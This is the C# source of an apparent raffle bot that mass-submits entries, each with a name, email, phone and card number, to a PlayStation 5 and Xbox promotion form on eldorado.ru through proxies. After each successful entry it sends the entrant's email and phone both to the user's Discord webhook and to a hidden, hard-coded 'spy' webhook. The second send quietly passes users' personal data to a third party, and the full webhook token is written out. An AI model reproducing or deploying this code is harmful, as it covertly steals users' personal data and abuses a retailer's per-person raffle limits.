using System;
using Leaf.xNet;
using System.Threading.Tasks;
using System.Threading;
using Discord.Webhook;
using Discord;
using System.Collections.Generic;

namespace STDAPP
{
    class EldoradoTaskClass
    {
        public async Task ShowStatus(string ShowLog, TaskPage mytask)
        {
            await App.Current.Dispatcher.Invoke(async () =>
            {
                mytask.Status.Content = ShowLog;

            });
        }

        private string[] wordsP = new string[5];
        public string[] words = new string[5];

        public async void src(int i, TaskPage mytask, EldoradoRaflPage.DataGive dataGive, CancellationToken token)
        {
            try
            {
                await ShowStatus("Loading form", mytask);

                words = dataGive.Account.Split(':', '\n', '\t', '\r');
                Console.WriteLine(words[0] + ":" + words[1] + ":" + words[2] + ":" + words[3]);

                void CheckStopedTask()
                {
                    if (token.IsCancellationRequested)
                    {
                        Console.WriteLine("Stoped");
                        token.ThrowIfCancellationRequested();
                    }
                }

                HttpRequest request = new HttpRequest();
                request.Cookies = new CookieStorage();
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36";

                if (dataGive.Proxy != null)
                {
                    try
                    {
                        request.Proxy = HttpProxyClient.Parse(dataGive.Proxy);
                        Console.WriteLine(request.Proxy);
                    }
                    catch
                    {
                        await ShowStatus("Failed proxy", mytask);
                    }

                }

                HttpResponse httpresp = request.Get("https://www.eldorado.ru/promo/prm-playstation5/");
                string resp = httpresp.ToString();
                Console.WriteLine(resp);

                CheckStopedTask(); // check pause

                request.AddHeader("authority", "www.eldorado.ru");
                request.AddHeader("path", "/_ajax/handler_form_for_module.php");
                request.AddHeader("accept", "application/json, text/javascript, */*; q=0.01");
                request.AddHeader("X-Requested-With", "XMLHttpRequest");
                request.AddHeader("Origin", "https://www.eldorado.ru");
                request.AddHeader("X-CSRF-Token", "_WSIiHPgpShwFIw1s9t4PWpVNbfc2B4JmX2MIv3Zg0a7DbnpRJbcbSZDtVL3lSpRDy1dgovoUkjtO-FxqrXIJw==");
                request.AddHeader("Referer", "https://www.eldorado.ru/promo/prm-playstation5/");
                string name = words[0];
                string email = words[1];
                string phone = words[2];
                string card = words[3];

                var multipartContent = new MultipartContent()
                {
                    {new StringContent(name), "NAME"},
                    {new StringContent(email), "EMAIL"},
                    {new StringContent("+7"+ " " + "(" + phone[0] + phone[1] + phone[2] + ")" + " " +  phone[3] + phone[4] + phone[5] + "-" + phone[6] + phone[7] + "-" +  phone[8] + phone[9]), "PHONE"},//+7 (911) 778-61-59
                    {new StringContent(card), "CARD"},
                    {new StringContent("PlayStation 5"), "MODEL"},
                    {new StringContent("FORM_PLAYSTATION5_CARD"), "SID_FORM"},
                };

                var multipartContentDigital = new MultipartContent()
                {
                    {new StringContent(name), "NAME"},
                    {new StringContent(email), "EMAIL"},
                    {new StringContent("+7"+ " " + "(" + phone[0] + phone[1] + phone[2] + ")" + " " +  phone[3] + phone[4] + phone[5] + "-" + phone[6] + phone[7] + "-" +  phone[8] + phone[9]), "PHONE"},//+7 (911) 778-61-59
                    {new StringContent(card), "CARD"},
                    {new StringContent("PlayStation 5 Digital Edition"), "MODEL"},
                    {new StringContent("FORM_PLAYSTATION5_CARD"), "SID_FORM"},
                };

                var multipartContentXBox = new MultipartContent()
                {
                    {new StringContent(name), "NAME"},
                    {new StringContent(email), "EMAIL"},
                    {new StringContent("+7"+ " " + "(" + phone[0] + phone[1] + phone[2] + ")" + " " +  phone[3] + phone[4] + phone[5] + "-" + phone[6] + phone[7] + "-" +  phone[8] + phone[9]), "PHONE"},//+7 (911) 778-61-59
                    {new StringContent(card), "CARD"},
                    {new StringContent("Series X"), "MODEL"},
                    {new StringContent("FORM_XBOX_ORDER"), "SID_FORM"},
                };

                string product = "";
                if (dataGive.PsVersion == 0)
                {
                    Console.WriteLine("Classic Ps");
                    product = "PS5";
                    httpresp = request.Post("https://www.eldorado.ru/_ajax/handler_form_for_module.php", multipartContent);
                }
                else if (dataGive.PsVersion == 1)
                {
                    Console.WriteLine("Digital Ps");
                    product = "Digital PS5";
                    httpresp = request.Post("https://www.eldorado.ru/_ajax/handler_form_for_module.php", multipartContentDigital);
                }
                else if (dataGive.PsVersion == 2)
                {
                    Console.WriteLine("Xbox ");
                    product = "XBox X";
                    httpresp = request.Post("https://www.eldorado.ru/_ajax/handler_form_for_module.php", multipartContentXBox);
                }

                resp = httpresp.ToString();
                Console.WriteLine("poshlo-poehalo");
                Console.WriteLine(resp);
                if (resp.Contains("ok"))
                {
                    await ShowStatus("Successfully posted", mytask);
                    string pathApi = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/STARDOM/discord.hook";
                    string api = System.IO.File.ReadAllText(pathApi);
                    var user = new DiscordWebhookClient(api);
                    var spy = new DiscordWebhookClient("https://discordapp.com/api/webhooks/757679702650519632/6SyMIC68oq9Bj_bW5wYlib4KeHq0ECZ-KZZK6UCZfz7AILtgBul-i0JZGWCfSjeeYniF");
                    EmbedBuilder eb = new EmbedBuilder();

                    eb.WithTitle("ELDO POSTED");
                    eb.AddField("Product", product);
                    eb.WithColor(0, 255, 0);
                    eb.AddField("Email", "||" + email + "||");
                    eb.AddField("Phone", "||" + phone + "||");
                    eb.WithFooter("STARDOM");
                    eb.WithCurrentTimestamp();
                    await user.SendMessageAsync(embeds: new List<Embed>() { eb.Build() });
                    await spy.SendMessageAsync(embeds: new List<Embed>() { eb.Build() });
                }
                else
                {
                    await ShowStatus("Error in posting", mytask);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                if (ex.ToString().Contains("System.OperationCanceledException"))
                {
                    await ShowStatus("Stopped", mytask);
                }
                else
                {
                    await ShowStatus("Error", mytask);
                }
            }
        }

    }
}